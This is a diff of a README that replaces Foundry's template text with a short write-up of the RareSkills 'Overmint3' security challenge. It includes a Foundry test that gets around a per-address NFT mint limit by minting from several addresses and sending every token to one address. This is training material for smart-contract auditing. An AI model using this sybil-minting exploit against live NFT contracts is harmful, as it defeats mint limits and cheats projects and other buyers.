@@ -1,66 +1,28 @@
-## Foundry
+# RareSkills Riddles - Overmint3
 
-**Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust.**
+Token can be minted by multiple adresses and then send NFT to single address. 
 
-Foundry consists of:
+Exploit: 
 
--   **Forge**: Ethereum testing framework (like Truffle, Hardhat and DappTools).
--   **Cast**: Swiss army knife for interacting with EVM smart contracts, sending transactions and getting chain data.
--   **Anvil**: Local Ethereum node, akin to Ganache, Hardhat Network.
--   **Chisel**: Fast, utilitarian, and verbose solidity REPL.
-
-## Documentation
-
-https://book.getfoundry.sh/
-
-## Usage
-
-### Build
-
-```shell
-$ forge build
 ```
+function test_overmintExploitr() public {
+        assertEq(overmint.totalSupply(), 0);
+        assertEq(overmint.balanceOf(user1), 0);
 
-### Test
+        vm.startPrank(user2);
+        overmint.mint();
+        overmint.safeTransferFrom(user2, user1, overmint.totalSupply());
 
-```shell
-$ forge test
-```
+        vm.startPrank(user3);
+        overmint.mint();
+        overmint.safeTransferFrom(user3, user1, overmint.totalSupply());
 
-### Format
+        vm.startPrank(user4);
+        overmint.mint();
+        overmint.safeTransferFrom(user4, user1, overmint.totalSupply());
+        
 
-```shell
-$ forge fmt
-```
-
-### Gas Snapshots
-
-```shell
-$ forge snapshot
-```
-
-### Anvil
-
-```shell
-$ anvil
-```
-
-### Deploy
-
-```shell
-$ forge script script/Counter.s.sol:CounterScript --rpc-url <your_rpc_url> --private-key <your_private_key>
-```
-
-### Cast
-
-```shell
-$ cast <subcommand>
-```
-
-### Help
-
-```shell
-$ forge --help
-$ anvil --help
-$ cast --help
+        assertEq(overmint.totalSupply(), 3);
+        assertEq(overmint.balanceOf(user1), 3);
+    }
 ```
